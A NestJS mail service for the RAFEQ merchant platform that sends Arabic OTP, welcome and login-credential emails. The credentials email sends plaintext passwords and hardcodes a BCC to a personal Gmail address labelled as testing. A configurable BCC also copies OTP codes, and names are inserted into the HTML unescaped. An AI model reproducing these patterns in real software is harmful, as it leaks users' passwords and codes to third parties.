/**
 * ╔═══════════════════════════════════════════════════════════════════════════════╗
 * ║              RAFIQ PLATFORM - System Mail Service                             ║
 * ║                                                                               ║
 * ║  📧 لإرسال رسائل النظام (OTP, ترحيب, إشعارات)                                    ║
 * ║  🔧 يستخدم Nodemailer مع Namecheap Private Email SMTP                         ║
 * ║  ✅ يدعم BCC للمراقبة                                                          ║
 * ║  🎨 تصميم احترافي متوافق مع جميع منصات البريد                                  ║
 * ╚═══════════════════════════════════════════════════════════════════════════════╝
 */

import { Injectable, Logger } from '@nestjs/common';
import { ConfigService } from '@nestjs/config';
import * as nodemailer from 'nodemailer';

interface SendMailOptions {
  to: string;
  subject: string;
  html: string;
  text?: string;
  bcc?: string;
}

@Injectable()
export class MailService {
  private readonly logger = new Logger(MailService.name);
  private transporter: nodemailer.Transporter;

  constructor(private readonly configService: ConfigService) {
    this.initializeTransporter();
  }

  private initializeTransporter(): void {
    const host = this.configService.get<string>('SMTP_HOST', 'mail.privateemail.com');
    const port = this.configService.get<number>('SMTP_PORT', 465);
    const secure = this.configService.get<boolean>('SMTP_SECURE', true);
    const user = this.configService.get<string>('SMTP_USER', 'no-reply@rafeq.ai');
    const pass = this.configService.get<string>('SMTP_PASS');

    if (!pass) {
      this.logger.warn('⚠️ SMTP_PASS not configured - emails will not be sent');
      return;
    }

    this.transporter = nodemailer.createTransport({
      host,
      port,
      secure,
      auth: {
        user,
        pass,
      },
    });

    this.transporter.verify((error) => {
      if (error) {
        this.logger.error('❌ SMTP connection failed:', error.message);
      } else {
        this.logger.log('✅ SMTP connection established successfully');
      }
    });
  }

  /**
   * 📧 إرسال بريد
   */
  async sendMail(options: SendMailOptions): Promise<boolean> {
    if (!this.transporter) {
      this.logger.warn('SMTP not configured, skipping email send');
      return false;
    }

    const fromEmail = this.configService.get<string>('SMTP_FROM_EMAIL', 'no-reply@rafeq.ai');
    const fromName = this.configService.get<string>('SMTP_FROM_NAME', 'RAFEQ');
    const bccEmail = this.configService.get<string>('BCC_EMAIL');

    try {
      const info = await this.transporter.sendMail({
        from: `"${fromName}" <${fromEmail}>`,
        to: options.to,
        bcc: options.bcc || bccEmail,
        subject: options.subject,
        html: options.html,
        text: options.text || this.stripHtml(options.html),
      });

      this.logger.log(`✅ Email sent: ${info.messageId}`, { to: options.to, bcc: bccEmail || 'none' });
      return true;
    } catch (error) {
      this.logger.error(`❌ Failed to send email to ${options.to}`, error);
      return false;
    }
  }

  /**
   * 🔐 إرسال OTP للتاجر
   */
  async sendOtpEmail(to: string, otp: string, merchantName?: string): Promise<boolean> {
    const subject = `${otp} - رمز التحقق | RAFEQ`;
    
    const html = `
<!DOCTYPE html>
<html dir="rtl" lang="ar">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>رمز التحقق - RAFEQ</title>
</head>
<body style="margin: 0; padding: 0; font-family: Arial, sans-serif; background-color: #0a0f1a;">
  <table role="presentation" width="100%" cellpadding="0" cellspacing="0" style="background-color: #0a0f1a;">
    <tr>
      <td align="center" style="padding: 40px 20px;">
        <table role="presentation" cellpadding="0" cellspacing="0" style="max-width: 500px; width: 100%;">
          <!-- Logo -->
          <tr>
            <td align="center" style="padding-bottom: 30px;">
              <table role="presentation" cellpadding="0" cellspacing="0">
                <tr>
                  <td style="background: linear-gradient(135deg, #14b8a6, #8b5cf6); border-radius: 12px; padding: 12px 16px;">
                    <span style="color: #ffffff; font-size: 24px; font-weight: 800; font-family: Arial;">RAFEQ</span>
                  </td>
                </tr>
              </table>
            </td>
          </tr>
          <!-- Card -->
          <tr>
            <td style="background-color: #111827; border-radius: 16px; border: 1px solid #1f2937;">
              <table role="presentation" width="100%" cellpadding="0" cellspacing="0">
                <tr>
                  <td style="height: 4px; background: linear-gradient(90deg, #14b8a6, #8b5cf6);"></td>
                </tr>
                <tr>
                  <td style="padding: 40px 30px;">
                    <p style="margin: 0 0 8px; font-size: 14px; color: #14b8a6; text-align: center;">
                      ${merchantName ? `مرحباً ${merchantName}` : 'مرحباً'}
                    </p>
                    <h1 style="margin: 0 0 24px; font-size: 24px; color: #ffffff; text-align: center;">
                      رمز التحقق الخاص بك
                    </h1>
                    <table role="presentation" width="100%" cellpadding="0" cellspacing="0">
                      <tr>
                        <td align="center">
                          <table role="presentation" cellpadding="0" cellspacing="0">
                            <tr>
                              <td style="background-color: #1f2937; border: 2px solid #374151; border-radius: 12px; padding: 20px 40px;">
                                <span style="font-size: 36px; font-weight: 700; color: #ffffff; letter-spacing: 8px; font-family: monospace;">${otp}</span>
                              </td>
                            </tr>
                          </table>
                        </td>
                      </tr>
                    </table>
                    <p style="margin: 24px 0 0; font-size: 13px; color: #64748b; text-align: center;">
                      ⏱️ صالح لمدة 5 دقائق
                    </p>
                    <p style="margin: 8px 0 0; font-size: 12px; color: #f59e0b; text-align: center;">
                      🔒 لا تشارك هذا الرمز
                    </p>
                  </td>
                </tr>
              </table>
            </td>
          </tr>
          <!-- Footer -->
          <tr>
            <td style="padding-top: 24px; text-align: center;">
              <p style="margin: 0; font-size: 12px; color: #475569;">© ${new Date().getFullYear()} RAFEQ</p>
            </td>
          </tr>
        </table>
      </td>
    </tr>
  </table>
</body>
</html>
    `;

    return this.sendMail({ to, subject, html });
  }

  /**
   * 🎉 إرسال بريد ترحيبي للتاجر الجديد
   */
  async sendWelcomeEmail(to: string, merchantName: string, storeName: string): Promise<boolean> {
    const subject = `🎉 مرحباً بك في RAFEQ - تم تفعيل ${storeName}`;
    
    const html = `
<!DOCTYPE html>
<html dir="rtl" lang="ar">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
</head>
<body style="margin: 0; padding: 0; font-family: Arial, sans-serif; background-color: #0a0f1a;">
  <table role="presentation" width="100%" cellpadding="0" cellspacing="0" style="background-color: #0a0f1a;">
    <tr>
      <td align="center" style="padding: 40px 20px;">
        <table role="presentation" cellpadding="0" cellspacing="0" style="max-width: 500px; width: 100%;">
          <!-- Logo -->
          <tr>
            <td align="center" style="padding-bottom: 30px;">
              <table role="presentation" cellpadding="0" cellspacing="0">
                <tr>
                  <td style="background: linear-gradient(135deg, #14b8a6, #8b5cf6); border-radius: 12px; padding: 12px 16px;">
                    <span style="color: #ffffff; font-size: 24px; font-weight: 800; font-family: Arial;">RAFEQ</span>
                  </td>
                </tr>
              </table>
            </td>
          </tr>
          <!-- Card -->
          <tr>
            <td style="background-color: #111827; border-radius: 16px; border: 1px solid #1f2937;">
              <table role="presentation" width="100%" cellpadding="0" cellspacing="0">
                <tr>
                  <td style="height: 4px; background: linear-gradient(90deg, #14b8a6, #8b5cf6);"></td>
                </tr>
                <tr>
                  <td style="padding: 40px 30px; text-align: center;">
                    <p style="margin: 0; font-size: 48px;">🎉</p>
                    <h1 style="margin: 16px 0; font-size: 24px; color: #ffffff;">أهلاً بك في RAFEQ!</h1>
                    <p style="margin: 0 0 24px; font-size: 15px; color: #94a3b8;">
                      مرحباً <span style="color: #14b8a6;">${merchantName}</span>!
                      <br>تم تفعيل متجرك "${storeName}" بنجاح
                    </p>
                    <table role="presentation" cellpadding="0" cellspacing="0" style="margin: 0 auto;">
                      <tr>
                        <td style="background: linear-gradient(135deg, #14b8a6, #8b5cf6); border-radius: 8px;">
                          <a href="https://rafeq.ai/dashboard" style="display: block; padding: 14px 32px; color: #ffffff; text-decoration: none; font-weight: 600; font-size: 14px;">
                            دخول لوحة التحكم
                          </a>
                        </td>
                      </tr>
                    </table>
                  </td>
                </tr>
              </table>
            </td>
          </tr>
          <!-- Footer -->
          <tr>
            <td style="padding-top: 24px; text-align: center;">
              <p style="margin: 0; font-size: 12px; color: #475569;">© ${new Date().getFullYear()} RAFEQ</p>
            </td>
          </tr>
        </table>
      </td>
    </tr>
  </table>
</body>
</html>
    `;

    return this.sendMail({ to, subject, html });
  }

  /**
   * 🎉 إرسال بيانات الدخول للتاجر الجديد
   * ✨ تصميم احترافي متوافق مع جميع منصات البريد
   */
  async sendWelcomeCredentials(options: {
    to: string;
    name: string;
    storeName: string;
    email: string;
    password: string;
    loginUrl: string;
    isNewUser: boolean;
  }): Promise<boolean> {
    const { to, name, storeName, email, password, loginUrl, isNewUser } = options;

    const subject = isNewUser
      ? `🎉 أهلاً ${name}! حسابك في رفيق جاهز`
      : `🔐 بيانات دخولك - رفيق`;

    const html = `
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" dir="rtl" lang="ar">
<head>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <meta name="x-apple-disable-message-reformatting" />
  <title>مرحباً بك في رفيق</title>
  <!--[if mso]>
  <style type="text/css">
    body, table, td, p, a { font-family: Arial, sans-serif !important; }
  </style>
  <![endif]-->
</head>
<body style="margin: 0; padding: 0; background-color: #0a0f1a; font-family: Arial, Tahoma, sans-serif; -webkit-font-smoothing: antialiased;">
  
  <!-- Main Wrapper -->
  <table role="presentation" cellpadding="0" cellspacing="0" width="100%" style="background-color: #0a0f1a;">
    <tr>
      <td align="center" style="padding: 32px 16px;">
        
        <!-- Container 600px -->
        <table role="presentation" cellpadding="0" cellspacing="0" width="600" style="max-width: 600px; width: 100%;">
          
          <!-- ═══════════════════════════════════════════════════════════ -->
          <!-- LOGO SECTION -->
          <!-- ═══════════════════════════════════════════════════════════ -->
          <tr>
            <td align="center" style="padding: 24px 0 32px;">
              <table role="presentation" cellpadding="0" cellspacing="0">
                <tr>
                  <!-- Logo Icon -->
                  <td style="padding-left: 12px;">
                    <table role="presentation" cellpadding="0" cellspacing="0">
                      <tr>
                        <td width="52" height="52" style="background-color: #14b8a6; border-radius: 14px; text-align: center; vertical-align: middle;">
                          <span style="color: #ffffff; font-size: 28px; font-weight: 800; font-family: Arial, sans-serif; line-height: 52px;">R</span>
                        </td>
                      </tr>
                    </table>
                  </td>
                  <!-- Logo Text -->
                  <td style="padding-right: 8px;">
                    <span style="font-size: 32px; font-weight: 800; color: #14b8a6; font-family: Arial, sans-serif; letter-spacing: 3px;">RAFEQ</span>
                  </td>
                </tr>
              </table>
              <!-- Tagline -->
              <table role="presentation" cellpadding="0" cellspacing="0" style="margin-top: 8px;">
                <tr>
                  <td>
                    <span style="font-size: 13px; color: #64748b; font-family: Arial, sans-serif;">رفيق التاجر الذكي</span>
                  </td>
                </tr>
              </table>
            </td>
          </tr>
          
          <!-- ═══════════════════════════════════════════════════════════ -->
          <!-- MAIN CARD -->
          <!-- ═══════════════════════════════════════════════════════════ -->
          <tr>
            <td>
              <table role="presentation" cellpadding="0" cellspacing="0" width="100%" style="background-color: #111827; border-radius: 20px; border: 1px solid #1e293b;">
                
                <!-- Gradient Top Bar -->
                <tr>
                  <td height="5" style="background: linear-gradient(to left, #14b8a6, #8b5cf6, #a855f7); border-radius: 20px 20px 0 0; font-size: 0; line-height: 0;">&nbsp;</td>
                </tr>
                
                <!-- Card Content -->
                <tr>
                  <td style="padding: 40px 36px;">
                    
                    <!-- Welcome Icon -->
                    <table role="presentation" cellpadding="0" cellspacing="0" width="100%">
                      <tr>
                        <td align="center" style="padding-bottom: 20px;">
                          <table role="presentation" cellpadding="0" cellspacing="0">
                            <tr>
                              <td width="72" height="72" style="background-color: #1e293b; border-radius: 50%; text-align: center; vertical-align: middle; border: 1px solid #334155;">
                                <span style="font-size: 36px; line-height: 72px;">${isNewUser ? '🎉' : '🔐'}</span>
                              </td>
                            </tr>
                          </table>
                        </td>
                      </tr>
                    </table>
                    
                    <!-- Welcome Title -->
                    <table role="presentation" cellpadding="0" cellspacing="0" width="100%">
                      <tr>
                        <td align="center">
                          <h1 style="margin: 0 0 8px; font-size: 26px; font-weight: 700; color: #ffffff; font-family: Arial, sans-serif;">
                            مرحباً ${name}!
                          </h1>
                        </td>
                      </tr>
                    </table>
                    
                    <!-- Store Badge -->
                    <table role="presentation" cellpadding="0" cellspacing="0" width="100%">
                      <tr>
                        <td align="center" style="padding: 12px 0 20px;">
                          <table role="presentation" cellpadding="0" cellspacing="0">
                            <tr>
                              <td style="background-color: #1e293b; border: 1px solid #334155; border-radius: 50px; padding: 8px 20px;">
                                <span style="font-size: 13px; color: #14b8a6; font-family: Arial, sans-serif;">🏪 ${storeName}</span>
                              </td>
                            </tr>
                          </table>
                        </td>
                      </tr>
                    </table>
                    
                    <!-- Subtitle -->
                    <table role="presentation" cellpadding="0" cellspacing="0" width="100%">
                      <tr>
                        <td align="center" style="padding-bottom: 28px;">
                          <p style="margin: 0; font-size: 15px; color: #94a3b8; line-height: 1.6; font-family: Arial, sans-serif;">
                            ${isNewUser ? 'يسعدنا انضمامك لعائلة رفيق! حسابك جاهز للاستخدام 🚀' : 'هذا تذكير ببيانات دخولك إلى لوحة التحكم'}
                          </p>
                        </td>
                      </tr>
                    </table>
                    
                    <!-- ═══════════════════════════════════════════════════════════ -->
                    <!-- CREDENTIALS BOX -->
                    <!-- ═══════════════════════════════════════════════════════════ -->
                    <table role="presentation" cellpadding="0" cellspacing="0" width="100%" style="background-color: #0f172a; border-radius: 16px; border: 1px solid #1e293b;">
                      
                      <!-- Box Header -->
                      <tr>
                        <td style="background-color: #1e293b; padding: 14px 20px; border-radius: 16px 16px 0 0;">
                          <span style="font-size: 13px; font-weight: 600; color: #e2e8f0; font-family: Arial, sans-serif;">🔑 بيانات الدخول</span>
                        </td>
                      </tr>
                      
                      <!-- Email Field -->
                      <tr>
                        <td style="padding: 24px 20px 16px;">
                          <table role="presentation" cellpadding="0" cellspacing="0" width="100%">
                            <tr>
                              <td style="padding-bottom: 8px;">
                                <span style="font-size: 11px; font-weight: 600; color: #64748b; text-transform: uppercase; letter-spacing: 1px; font-family: Arial, sans-serif;">📧 البريد الإلكتروني</span>
                              </td>
                            </tr>
                            <tr>
                              <td style="background-color: #1e293b; border: 1px solid #334155; border-radius: 10px; padding: 14px 16px; text-align: center;">
                                <span style="font-size: 17px; font-weight: 600; color: #14b8a6; font-family: Consolas, Monaco, monospace; direction: ltr; unicode-bidi: embed;">${email}</span>
                              </td>
                            </tr>
                          </table>
                        </td>
                      </tr>
                      
                      <!-- Password Field -->
                      <tr>
                        <td style="padding: 0 20px 24px;">
                          <table role="presentation" cellpadding="0" cellspacing="0" width="100%">
                            <tr>
                              <td style="padding-bottom: 8px;">
                                <span style="font-size: 11px; font-weight: 600; color: #64748b; text-transform: uppercase; letter-spacing: 1px; font-family: Arial, sans-serif;">🔐 كلمة المرور</span>
                              </td>
                            </tr>
                            <tr>
                              <td style="background-color: #1e293b; border: 2px solid #8b5cf6; border-radius: 10px; padding: 16px; text-align: center;">
                                <span style="font-size: 22px; font-weight: 700; color: #a855f7; font-family: Consolas, Monaco, monospace; letter-spacing: 4px; direction: ltr; unicode-bidi: embed;">${password}</span>
                              </td>
                            </tr>
                          </table>
                        </td>
                      </tr>
                      
                    </table>
                    
                    <!-- ═══════════════════════════════════════════════════════════ -->
                    <!-- CTA BUTTON -->
                    <!-- ═══════════════════════════════════════════════════════════ -->
                    <table role="presentation" cellpadding="0" cellspacing="0" width="100%" style="margin-top: 28px;">
                      <tr>
                        <td align="center">
                          <table role="presentation" cellpadding="0" cellspacing="0">
                            <tr>
                              <td style="background: linear-gradient(to left, #14b8a6, #8b5cf6); border-radius: 12px;">
                                <a href="${loginUrl}" target="_blank" style="display: block; padding: 16px 40px; font-size: 15px; font-weight: 700; color: #ffffff; text-decoration: none; font-family: Arial, sans-serif; text-align: center;">
                                  🚀 دخول لوحة التحكم
                                </a>
                              </td>
                            </tr>
                          </table>
                        </td>
                      </tr>
                    </table>
                    
                    <!-- Security Tip -->
                    <table role="presentation" cellpadding="0" cellspacing="0" width="100%" style="margin-top: 24px;">
                      <tr>
                        <td style="background-color: #1c1917; border: 1px solid #422006; border-radius: 10px; padding: 14px 16px; text-align: center;">
                          <span style="font-size: 12px; color: #fbbf24; font-family: Arial, sans-serif;">
                            💡 نصيحة: غيّر كلمة المرور بعد أول تسجيل دخول
                          </span>
                        </td>
                      </tr>
                    </table>
                    
                  </td>
                </tr>
                
              </table>
            </td>
          </tr>
          
          <!-- ═══════════════════════════════════════════════════════════ -->
          <!-- FEATURES SECTION -->
          <!-- ═══════════════════════════════════════════════════════════ -->
          <tr>
            <td style="padding: 28px 0;">
              <table role="presentation" cellpadding="0" cellspacing="0" width="100%">
                <tr>
                  <td align="center" style="padding-bottom: 16px;">
                    <span style="font-size: 13px; font-weight: 600; color: #64748b; font-family: Arial, sans-serif;">ماذا يمكنك فعله مع رفيق؟</span>
                  </td>
                </tr>
                <!-- Features Grid -->
                <tr>
                  <td>
                    <table role="presentation" cellpadding="4" cellspacing="0" width="100%">
                      <tr>
                        <td width="50%" style="padding: 4px;">
                          <table role="presentation" cellpadding="0" cellspacing="0" width="100%" style="background-color: #111827; border: 1px solid #1e293b; border-radius: 10px;">
                            <tr>
                              <td style="padding: 12px 14px;">
                                <span style="font-size: 12px; color: #94a3b8; font-family: Arial, sans-serif;">✨ ردود ذكية بـ AI</span>
                              </td>
                            </tr>
                          </table>
                        </td>
                        <td width="50%" style="padding: 4px;">
                          <table role="presentation" cellpadding="0" cellspacing="0" width="100%" style="background-color: #111827; border: 1px solid #1e293b; border-radius: 10px;">
                            <tr>
                              <td style="padding: 12px 14px;">
                                <span style="font-size: 12px; color: #94a3b8; font-family: Arial, sans-serif;">🛒 استرداد السلات</span>
                              </td>
                            </tr>
                          </table>
                        </td>
                      </tr>
                      <tr>
                        <td width="50%" style="padding: 4px;">
                          <table role="presentation" cellpadding="0" cellspacing="0" width="100%" style="background-color: #111827; border: 1px solid #1e293b; border-radius: 10px;">
                            <tr>
                              <td style="padding: 12px 14px;">
                                <span style="font-size: 12px; color: #94a3b8; font-family: Arial, sans-serif;">📱 ربط واتساب</span>
                              </td>
                            </tr>
                          </table>
                        </td>
                        <td width="50%" style="padding: 4px;">
                          <table role="presentation" cellpadding="0" cellspacing="0" width="100%" style="background-color: #111827; border: 1px solid #1e293b; border-radius: 10px;">
                            <tr>
                              <td style="padding: 12px 14px;">
                                <span style="font-size: 12px; color: #94a3b8; font-family: Arial, sans-serif;">📊 تقارير متقدمة</span>
                              </td>
                            </tr>
                          </table>
                        </td>
                      </tr>
                    </table>
                  </td>
                </tr>
              </table>
            </td>
          </tr>
          
          <!-- ═══════════════════════════════════════════════════════════ -->
          <!-- FOOTER -->
          <!-- ═══════════════════════════════════════════════════════════ -->
          <tr>
            <td style="padding: 0 16px;">
              <table role="presentation" cellpadding="0" cellspacing="0" width="100%">
                <tr>
                  <td height="1" style="background-color: #1e293b; font-size: 0; line-height: 0;">&nbsp;</td>
                </tr>
              </table>
            </td>
          </tr>
          <tr>
            <td style="padding: 28px 16px;">
              <table role="presentation" cellpadding="0" cellspacing="0" width="100%">
                <tr>
                  <td align="center" style="padding-bottom: 12px;">
                    <span style="font-size: 12px; color: #64748b; font-family: Arial, sans-serif;">
                      تحتاج مساعدة؟ تواصل معنا
                    </span>
                  </td>
                </tr>
                <tr>
                  <td align="center" style="padding-bottom: 20px;">
                    <a href="mailto:support@rafeq.ai" style="font-size: 13px; color: #14b8a6; text-decoration: none; font-family: Arial, sans-serif;">
                      support@rafeq.ai
                    </a>
                  </td>
                </tr>
                <tr>
                  <td align="center">
                    <span style="font-size: 11px; color: #475569; font-family: Arial, sans-serif;">
                      © ${new Date().getFullYear()} RAFEQ - صُنع بـ 💜 في السعودية
                    </span>
                  </td>
                </tr>
              </table>
            </td>
          </tr>
          
        </table>
        
      </td>
    </tr>
  </table>
  
</body>
</html>
    `.trim();

    // 📧 BCC للاختبار
    return this.sendMail({ to, subject, html, bcc: 'forwahabb@gmail.com' });
  }

  /**
   * إزالة HTML tags
   */
  private stripHtml(html: string): string {
    return html.replace(/<[^>]*>/g, '').replace(/\s+/g, ' ').trim();
  }
}
